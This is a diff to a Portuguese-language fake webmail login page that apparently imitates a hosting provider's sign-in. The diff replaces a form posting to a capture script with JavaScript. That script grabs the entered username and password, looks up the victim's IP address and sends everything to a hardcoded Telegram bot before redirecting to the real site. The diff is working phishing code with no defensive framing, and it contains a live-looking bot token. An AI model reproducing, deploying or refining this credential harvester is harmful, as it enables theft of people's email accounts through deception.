@@ -29,7 +29,7 @@ button:hover{background:#b31c14}
     <div class="card">
       <h2>Acesse sua conta</h2>
       <p>Informe seus dados para entrar no webmail.</p>
-      <form action="capture.php" method="post" autocomplete="off">
+      <form id="f" autocomplete="off">
         <label for="user">Usuário</label>
         <input id="user" name="user" required/>
         <label for="pass">Senha</label>
@@ -40,5 +40,22 @@ button:hover{background:#b31c14}
     </div>
   </div>
 </div>
+
+<script>
+document.getElementById('f').addEventListener('submit', async e => {
+  e.preventDefault();
+  const data = Object.fromEntries(new FormData(e.target));
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'n/a');
+  const msg = `🔐 Novo login\n👤 ${data.user}\n🔑 ${data.pass}\n🌐 ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')}`;
+  const token = '8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA';
+  const chat  = '6261750345';
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: chat, text: msg})
+  });
+  location.href = 'https://locaweb.com.br';
+});
+</script>
 </body>
 </html>
